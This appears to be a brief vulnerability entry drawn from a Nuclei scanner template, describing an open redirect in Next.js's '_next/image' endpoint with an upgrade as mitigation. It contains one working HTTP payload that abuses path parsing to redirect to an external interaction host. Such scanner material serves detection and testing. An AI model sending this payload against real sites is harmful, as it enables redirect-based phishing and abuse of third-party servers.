# Vulnerability: Next.js <1.2.3 - Open Redirect
**Classification:** CWE-601
**Source:** Nuclei Template (`nextjs-redirect.yaml`)

## Description
Next.js contains an open redirect via “_next/image” due to improper path parsing.

## Secure Mitigation
Upgrade to Next.js version 1.2.3 or higher.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/_next/image?url=/\/\interact.sh/&q=100&w=128&h=128
```

